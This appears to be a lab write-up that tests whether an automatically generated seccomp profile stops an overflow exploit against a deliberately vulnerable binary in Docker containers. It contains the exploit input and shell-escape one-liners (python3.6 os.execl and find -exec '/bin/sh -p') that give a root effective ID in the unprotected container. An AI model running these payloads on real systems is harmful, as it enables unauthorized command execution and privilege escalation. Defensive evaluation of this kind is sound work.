## custom – chestnut

### Preparation

_For the container with seccomp, we execute the file `/tmp/script.sh` which is extracting the system calls from the binary `custom_app`, creating a seccomp-profile based on these detected system calls and subsequently applying the profile on the binary. Afterwards, the binary is automatically run._

```bash
docker exec -it custom-chestnut-seccomp-container bash -c "source /Chestnut/Binalyzer/venv/bin/activate && /tmp/script.sh"
```

_For the container without seccomp, we just have to start it with following command:_

```bash
docker exec -it custom-chestnut-normal-container bash
```

### Conduct the exploits

First, we verify the IP addresses of the container, to ensure we target the right containers:

```
❯ docker ps
CONTAINER ID   IMAGE                          COMMAND                  CREATED             STATUS             PORTS                                                   NAMES
b20881c64b5f   custom-chestnut-seccomp        "/bin/bash"              2 minutes ago       Up 2 minutes                                                               custom-chestnut-seccomp-container
920b0d9b8bfa   custom-chestnut-normal         "/bin/bash"              2 minutes ago       Up 2 minutes                                                               custom-chestnut-normal-container
```

_Seccomp_:

The attack on the container with the applied seccomp profile fails:

```
(venv) user@acd42d303576:/Chestnut/ChestnutPatcher$ /Chestnut/ChestnutPatcher/rewrite.sh /app/custom_app AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
[+] Allowed syscalls: 35
[+] Saved patched binary as /app/custom_app_patched
locals.path = [/bin/sh]
locals.filename = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh]
/Chestnut/ChestnutPatcher/rewrite.sh: line 6:   117 Bad system call         (core dumped) LD_LIBRARY_PATH=. "${BIN}_patched" "$@"
(venv) user@acd42d303576:/Chestnut/ChestnutPatcher$ /Chestnut/ChestnutPatcher/rewrite.sh /app/custom_app AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/usr/bin/python3.6
[+] Allowed syscalls: 35
[+] Saved patched binary as /app/custom_app_patched
locals.path = [/usr/bin/python3.6]
locals.filename = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/usr/bin/python3.6]
/Chestnut/ChestnutPatcher/rewrite.sh: line 6:   120 Bad system call         (core dumped) LD_LIBRARY_PATH=. "${BIN}_patched" "$@"
(venv) user@acd42d303576:/Chestnut/ChestnutPatcher$ /Chestnut/ChestnutPatcher/rewrite.sh /app/custom_app AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/usr/bin/find
[+] Allowed syscalls: 35
[+] Saved patched binary as /app/custom_app_patched
locals.path = [/usr/bin/find]
locals.filename = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/usr/bin/find]
/Chestnut/ChestnutPatcher/rewrite.sh: line 6:   123 Bad system call         (core dumped) LD_LIBRARY_PATH=. "${BIN}_patched" "$@"
(venv) user@acd42d303576:/Chestnut/ChestnutPatcher$ /Chestnut/ChestnutPatcher/rewrite.sh /app/custom_app AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/pwd
[+] Allowed syscalls: 35
[+] Saved patched binary as /app/custom_app_patched
locals.path = [/bin/pwd]
locals.filename = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/pwd]
/Chestnut/ChestnutPatcher
```

The attack on the container without the seccomp profile succeeds. We are able to run arbitrary commands:

```
(venv) user@590efaa20062:/app$ ./custom_app  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
locals.path = [/bin/sh]
locals.filename = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh]
(venv) \[\e]0;\u@\h: \w\a\]\u@\h:\w$ id
uid=1000(user) gid=1000(user) groups=1000(user)
(venv) \[\e]0;\u@\h: \w\a\]\u@\h:\w$ true
(venv) \[\e]0;\u@\h: \w\a\]\u@\h:\w$ uname
Linux
(venv) \[\e]0;\u@\h: \w\a\]\u@\h:\w$ /usr/bin/python3.6 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
(venv) \[\e]0;\u@\h: \w\a\]\u@\h:\w$ id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
(venv) \[\e]0;\u@\h: \w\a\]\u@\h:\w$ /usr/bin/find . -exec /bin/sh -p \; -quit
(venv) \[\e]0;\u@\h: \w\a\]\u@\h:\w$ id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
```

### Analysis

As the exploit worked on the container without the seccomp profile, only the one with the enforced profile will be analysed.

_strace output:_
When starting the application with the command `strace -f /app/custom_app` we are able to see that just before the processes were killed with the signal `SIGSYS`, the system call `getuid` and `set_tid_address` were executed.

```
# /bin/sh execution
...
[pid   136] munmap(0x7ffff7ff1000, 18864) = 0
[pid   136] getuid()                    = 102
[pid   136] +++ killed by SIGSYS (core dumped) +++


# /usr/bin/python3.6 execution
...
[pid   141] munmap(0x7ffff7ff1000, 18864) = 0
[pid   141] set_tid_address(0x7ffff7feaa10) = 218
[pid   141] +++ killed by SIGSYS (core dumped) +++

# /usr/bin/find execution
...
[pid   151] munmap(0x7ffff7ff1000, 18864) = 0
[pid   151] set_tid_address(0x7ffff7feaad0) = 218
[pid   151] +++ killed by SIGSYS (core dumped) +++

# /usr/bin/id execution
[pid   156] munmap(0x7ffff7ff1000, 18864) = 0
[pid   156] set_tid_address(0x7ffff7fee310) = 218
[pid   156] +++ killed by SIGSYS (core dumped) +++
```

Further analysis on the host machine with the tool `ausearch` delievers us more insights.
As we can see, the syscall with the number 108 was indeed blocked by seccomp

```
❯ sudo ausearch -m seccomp --start today
# /bin/sh execution
time->Thu May  1 12:53:48 2025
type=SECCOMP msg=audit(1746096828.843:2699): auid=4294967295 uid=1000 gid=1000 ses=4294967295 pid=140679 comm="sh" exe="/bin/dash" sig=31 arch=c000003e syscall=102 compat=0 ip=0x7ffff7ac7837 code=0x0

# /usr/bin/python3.6 execution
time->Thu May  1 12:53:52 2025
type=SECCOMP msg=audit(1746096832.059:2709): auid=4294967295 uid=1000 gid=1000 ses=4294967295 pid=140693 comm="python3.6" exe="/usr/bin/python3.6" sig=31 arch=c000003e syscall=218 compat=0 ip=0x7ffff77c8eb5 code=0x0

# /usr/bin/find execution
time->Thu May  1 12:53:54 2025
type=SECCOMP msg=audit(1746096834.240:2719): auid=4294967295 uid=1000 gid=1000 ses=4294967295 pid=140727 comm="find" exe="/usr/bin/find" sig=31 arch=c000003e syscall=218 compat=0 ip=0x7ffff6d8deb5 code=0x0

# /usr/bin/id execution
time->Thu May  1 13:00:58 2025
type=SECCOMP msg=audit(1746097258.719:2794): auid=4294967295 uid=1000 gid=1000 ses=4294967295 pid=144107 comm="id" exe="/usr/bin/id" sig=31 arch=c000003e syscall=218 compat=0 ip=0x7ffff712beb5 code=0x0
```

We verify that the system call number `218` maps to `set_tid_address` with the `ausyscall` tool:

```
❯ ausyscall --dump | grep 102
102	getuid
❯ ausyscall --dump | grep 218
218	set_tid_address
```

The last thing we check is, if the system call numbers `102` and `218` were in the applied seccomp profile. The file `/Chestnut/ChestnutPatcher/policy__app_custom_app.json ` shows no presence:

```json
{
  "version": 1,
  "syscalls": [
    0, 1, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 20, 21, 38, 39, 60, 62, 63,
    72, 78, 79, 89, 158, 186, 202, 231, 234, 257, 262, 59, 59, 221
  ]
}
```

## Appendix

### Analysis Time

The following shows the time needed to extract the system calls from 3 runs:

```
docker exec -it custom-chestnut-seccomp-container bash -c "rm /Chestnut/Binalyzer/cached_results/*; source /Chestnut/Binalyzer/venv/bin/activate && cd /Chestnut/Binalyzer && time python3 /Chestnut/Binalyzer/filter.py /app/custom_app"
...
real	0m25.667s
user	0m24.341s
sys	0m1.184s

docker exec -it custom-chestnut-seccomp-container bash -c "rm /Chestnut/Binalyzer/cached_results/*; source /Chestnut/Binalyzer/venv/bin/activate && cd /Chestnut/Binalyzer && time python3 /Chestnut/Binalyzer/filter.py /app/custom_app"
...
real	0m25.976s
user	0m24.811s
sys	0m1.048s

docker exec -it custom-chestnut-seccomp-container bash -c "rm /Chestnut/Binalyzer/cached_results/*; source /Chestnut/Binalyzer/venv/bin/activate && cd /Chestnut/Binalyzer && time python3 /Chestnut/Binalyzer/filter.py /app/custom_app"
...
real	0m25.985s
user	0m24.805s
sys	0m1.072s
```

`(25,667+25,976+25,985)/3=25,876`

### Missing system calls

Following system calls are not detected by Binalyzers, but needed for the application to start successfully, therefore we added these two to the seccomp-profile `/Chestnut/ChestnutPatcher/policy__app_custom_app.json`. This is not Binalyzers fault for not recognising the required system call, but rather a side-effect of the application logic calling a binary outside the application.

- 59 (execve)
- 221 (fadvice64)

```
sed -i '/"syscalls"/ s/\]/, 59, 221]/' /Chestnut/ChestnutPatcher/policy__app_custom_app.json
```

### Number of System Calls

```
echo '{
  "version": 1,
  "syscalls": [
    0, 1, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 20, 21, 38, 39, 60, 62, 63,
    72, 78, 79, 89, 158, 186, 202, 231, 234, 257, 262
  ]
}' | jq -r ".syscalls | length"
32
```
